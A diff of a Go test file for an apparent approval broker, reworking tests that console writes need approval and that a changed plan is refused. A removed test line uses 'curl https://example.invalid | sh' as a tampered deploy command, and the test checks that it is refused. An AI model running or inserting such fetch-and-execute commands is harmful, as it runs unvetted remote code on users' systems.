@@ -13,7 +13,6 @@ import (
 	"github.com/hollis-labs/cerberus/internal/audit"
 	"github.com/hollis-labs/cerberus/internal/config"
 	"github.com/hollis-labs/cerberus/internal/connector"
-	"github.com/hollis-labs/cerberus/internal/infra"
 	"github.com/hollis-labs/cerberus/internal/policy"
 	"github.com/hollis-labs/cerberus/internal/target"
 	contract "github.com/hollis-labs/cerberus/pkg/connector"
@@ -51,11 +50,6 @@ func consoleDaemon(t *testing.T, sink audit.Sink, cfgPath string, store *console
 	return socket
 }
 
-func consoleProfile() infra.DeploymentProfile {
-	return infra.DeploymentProfile{ID: "site", Name: "Site", Provider: "vercel", RepoPath: "/tmp/site", DeployCommand: "true",
-		Env: target.EnvDev, Owner: target.OwnerSelf, Admin: target.Admin{Default: target.AdminSelf}}
-}
-
 func approvalOf(t *testing.T, err error) *ApprovalRef {
 	t.Helper()
 	var coded *ExternalConnectorError
@@ -65,68 +59,58 @@ func approvalOf(t *testing.T, err error) *ApprovalRef {
 	return coded.Approval
 }
 
-// A console write is asked for, confirmed and made in the daemon, where
-// the broker holds its approval: a dev/self profile is confirmed on the
-// call against the plan the console showed, and a plan that changed in
-// between is refused.
-func TestAConsoleWriteIsConfirmedInTheDaemon(t *testing.T) {
+// A console write is asked for, approved and made in the daemon, where
+// the broker holds its approval. A console target has no labels of its own,
+// so it is out of band; a write that changed after the approval was made is
+// refused and stores nothing, and the approved write runs once.
+func TestAConsoleWriteIsApprovedAndMadeInTheDaemon(t *testing.T) {
 	sink := audit.NewMemory()
 	broker := enforcedBroker(t, sink)
-	cfgPath := filepath.Join(t.TempDir(), "config.yaml")
-	client := consoleDaemon(t, sink, cfgPath, &consoleSecrets{values: map[string]string{}})
+	// Out of band: a test verifier stands in for the presence proof.
+	broker.SetPresenceVerifier(acceptPresence{})
+	store := &consoleSecrets{values: map[string]string{}}
+	client := consoleDaemon(t, sink, filepath.Join(t.TempDir(), "config.yaml"), store)
 	ctx := context.Background()
-	profile := consoleProfile()
-	req := ConsoleWriteRequest{Operation: ConsoleProfileSave, Profile: &profile}
+	req := ConsoleWriteRequest{Operation: ConsoleProviderSave, ID: "cloudflare", Secrets: map[string]string{"api_token": "tok-approved"}}
 
 	_, err := client.ConsoleWrite(ctx, req)
 	ref := approvalOf(t, err)
-	if ref.Channel != approval.ChannelTTYConfirm || ref.ID == "" {
-		t.Fatalf("a dev/self profile should ask for a confirmation the daemon holds: %+v", ref)
+	if ref.Channel != approval.ChannelOutOfBand || ref.ID == "" {
+		t.Fatalf("a console write should ask for an out-of-band approval the daemon holds: %+v", ref)
 	}
 	shown, err := client.PlanConsoleWrite(ctx, req)
-	if err != nil || !strings.HasPrefix(shown.PlanHash, "sha256:") || shown.Plan.Target.Env != "dev" || shown.Plan.Target.Resource != "site" || shown.Plan.State != "adds a profile" {
+	if err != nil || !strings.HasPrefix(shown.PlanHash, "sha256:") || shown.Plan.Target.Resource != "cloudflare" {
 		t.Fatalf("plan: %+v %v", shown, err)
 	}
-
-	// The same write with another command is another plan.
-	changed := profile
-	changed.DeployCommand = "curl https://example.invalid | sh"
-	if _, stale := client.ConsoleWrite(ctx, ConsoleWriteRequest{Operation: ConsoleProfileSave, Profile: &changed}, WithApprovalID(ref.ID), WithConfirmedPlanHash(shown.PlanHash)); stale == nil || !strings.Contains(stale.Error(), "plan changed") {
-		t.Fatalf("a changed write confirmed against the shown plan: %v", stale)
-	}
-	if state, _ := infra.LoadState(cfgPath); len(state.Profiles) != 0 {
-		t.Fatalf("a refused write wrote %+v", state.Profiles)
+	if _, err = broker.Decide(ctx, ref.ID, approval.Decision{Approve: true, By: audit.Principal{Kind: "human", Via: "cli"}}); err != nil {
+		t.Fatal(err)
 	}
 
-	result, err := client.ConsoleWrite(ctx, req, WithApprovalID(ref.ID), WithConfirmedPlanHash(shown.PlanHash))
-	if err != nil || !result.Success {
-		t.Fatalf("confirmed write: %+v %v", result, err)
+	// The same write with another credential is another plan.
+	changed := ConsoleWriteRequest{Operation: ConsoleProviderSave, ID: "cloudflare", Secrets: map[string]string{"api_token": "tok-swapped"}}
+	if _, stale := client.ConsoleWrite(ctx, changed, WithApprovalID(ref.ID)); stale == nil {
+		t.Fatal("a changed write ran under the approval of another")
 	}
-	if a, _ := broker.Get(ref.ID); a.Status != approval.Consumed || a.Decision.By.Session != "sess-1" {
+	if len(store.values) != 0 {
+		t.Fatalf("a refused write stored %v", store.values)
+	}
+
+	result, err := client.ConsoleWrite(ctx, req, WithApprovalID(ref.ID))
+	if err != nil || !result.Success || store.values["cloudflare/api_token"] != "tok-approved" {
+		t.Fatalf("approved write: %+v %v %v", result, err, store.values)
+	}
+	if a, _ := broker.Get(ref.ID); a.Status != approval.Consumed {
 		t.Fatalf("approval %+v", a)
-	}
-	if state, _ := infra.LoadState(cfgPath); len(state.Profiles) != 1 {
-		t.Fatalf("saved %+v", state.Profiles)
 	}
 }
 
-// Relabeling a profile moves it between approval channels, so it is
-// approved as an unlabeled target is: out of band, in either direction.
-// Registry, provider and restore targets carry no labels of their own.
-func TestAConsoleRelabelNeedsOutOfBand(t *testing.T) {
+// Registry, credential and restore targets carry no labels of their own, so
+// each is approved as an unlabeled target is: out of band.
+func TestConsoleWritesNeedOutOfBand(t *testing.T) {
 	sink := audit.NewMemory()
 	enforcedBroker(t, sink)
-	cfgPath := filepath.Join(t.TempDir(), "config.yaml")
-	saved := consoleProfile()
-	saved.Env = target.EnvProd
-	if err := infra.SaveState(cfgPath, &infra.State{Version: 1, Profiles: []infra.DeploymentProfile{saved}}); err != nil {
-		t.Fatal(err)
-	}
-	client := consoleDaemon(t, sink, cfgPath, &consoleSecrets{values: map[string]string{}})
-	relabeled := consoleProfile()
+	client := consoleDaemon(t, sink, filepath.Join(t.TempDir(), "config.yaml"), &consoleSecrets{values: map[string]string{}})
 	for _, req := range []ConsoleWriteRequest{
-		{Operation: ConsoleProfileSave, Profile: &relabeled},
-		{Operation: ConsoleProfileDelete, ID: "site"},
 		{Operation: ConsoleRegistryDeregister, ID: "someone"},
 		{Operation: ConsoleConfigRestore},
 		{Operation: ConsoleProviderSave, ID: "cloudflare", Secrets: map[string]string{"api_token": "a"}},
@@ -171,7 +155,7 @@ func TestProviderCredentialsReachOnlyTheStore(t *testing.T) {
 }
 
 // With policy allowing it, a write runs; its refusals keep their status
-// over the socket: a missing profile 404, a refused input 400.
+// over the socket: a refused input 400.
 func TestConsoleWriteRefusalsOverTheSocket(t *testing.T) {
 	withPDP(t, constantPDP{decision: policy.Allow})
 	sink := audit.NewMemory()
@@ -184,15 +168,9 @@ func TestConsoleWriteRefusalsOverTheSocket(t *testing.T) {
 	if err != nil || !result.Success || !result.SecretsChanged || store.values["cloudflare/api_token"] != "tok" {
 		t.Fatalf("provider save: %+v %v %v", result, err, store.values)
 	}
-	_, err = client.ConsoleWrite(ctx, ConsoleWriteRequest{Operation: ConsoleProfileDelete, ID: "ghost"})
-	if status, _ := DaemonHTTPStatus(err); status != http.StatusNotFound {
-		t.Fatalf("delete a missing profile: %d %v", status, err)
-	}
-	bad := consoleProfile()
-	bad.Env = "devv"
-	_, err = client.ConsoleWrite(ctx, ConsoleWriteRequest{Operation: ConsoleProfileSave, Profile: &bad})
-	if status, _ := DaemonHTTPStatus(err); status != http.StatusBadRequest || !strings.Contains(err.Error(), "labels") {
-		t.Fatalf("a misspelled label: %d %v", status, err)
+	_, err = client.ConsoleWrite(ctx, ConsoleWriteRequest{Operation: ConsoleRegistryRegister})
+	if status, _ := DaemonHTTPStatus(err); status != http.StatusBadRequest || !strings.Contains(err.Error(), "path is required") {
+		t.Fatalf("a register with no path: %d %v", status, err)
 	}
 	restored, err := client.ConsoleWrite(ctx, ConsoleWriteRequest{Operation: ConsoleConfigRestore, Path: "/nonexistent/backup.yaml"})
 	if err != nil || restored.Success || restored.Error == "" {
@@ -201,7 +179,7 @@ func TestConsoleWriteRefusalsOverTheSocket(t *testing.T) {
 	if o := outcome(sink.Records()); o.Operation != ConsoleConfigRestore || o.OutcomeCode == audit.OutcomeOK {
 		t.Fatalf("the failed restore is not on the record: %+v", o)
 	}
-	err = client.doJSON(ctx, http.MethodPost, "/console/profile_delete/confirm", map[string]any{"request": map[string]any{"id": "site"}}, nil)
+	err = client.doJSON(ctx, http.MethodPost, "/console/registry_deregister/confirm", map[string]any{"request": map[string]any{"id": "someone"}}, nil)
 	if err == nil || !strings.Contains(err.Error(), "needs confirmed_plan_hash") {
 		t.Fatalf("confirm without a hash: %v", err)
 	}
